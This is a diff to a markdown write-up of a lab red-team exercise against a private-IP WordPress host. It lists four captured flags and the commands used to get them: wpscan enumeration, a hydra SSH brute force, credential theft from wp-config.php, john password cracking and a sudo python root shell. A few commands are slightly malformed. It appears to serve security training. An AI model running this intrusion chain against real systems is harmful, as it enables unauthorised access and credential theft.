@@ -136,6 +136,54 @@ The Red Team was able to penetrate Target 1 and retrive the following confidenti
 ### Target 1
 
 - flag1.txt - flag1{b9bbccb33e11b80be759c4e844862482d}
-   - Exploit Used
-     - Used
-       
+  - Exploit Used
+     - Used wpscan to enumerate wordpress users and access the system.
+     - Identified user michael.
+   - Commands: 
+     - wpscan --url -e http://192.168.1.110/wordpress
+     - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
+   - Location of flag: /var/www/html/service.html
+        
+![flag1 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag1.png)       
+
+- flag2.txt - flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+  - Exploit Used
+    - Used the same exploit as flag1.
+    - Used wpscan to enumerate wordpress users and access the system.
+    - Identified user michael.
+    - Used hydra to brute force michael's password.
+  - Commands:
+    - wpscan --url -e http://192.168.1.110/wordpress
+    - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
+  - Location: /var/www/flag2.txt
+    
+![flag2 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag2.png)    
+
+- flag3.txt - flag3{afc01ab56b50591e7dccf93122770cd2}
+  - Exploit Used
+    - Found wordpress dabatase credentials in wordpress installation.
+    - Used credentials to login and access database tables
+  - Commands:
+    - cd /var/www/html/wordpress/wp-config.php
+    - cat wp-config.php
+    - mysql -u root -p wordpress
+    - use wordpress
+    - SELECT * FROM wp_posts WHERE post_content LIKE 'flag3%';
+  - Location: in wordpress database, wp_posts table
+    
+![flag3 image](https://github.com/reyesgo/cybersec-project-docs/blob/main/Project%203/Images/Red/flag3.png)    
+
+- flag4.txt - flag4{715dea6c055b9fe3337544932f2941ce}
+  - Exploit Used 
+    - Used john the ripper to crack steven's password.
+    - Used SSH to connect with steven's credentials.
+    - Identified sudo privileges for steven.
+    - Used sudo privileges to gain root access
+  - Commands: 
+      - john --wordlist=usr/share/wordlists/rockyou.txt wp_hashes.txt
+      - ssh steven@192.168.1.110
+      - sudo -l
+      - sudo python -c 'import os; os.system("/bin/bash")'
+   - Location: /root/flag4.txt
+   
+![flag4 image]()
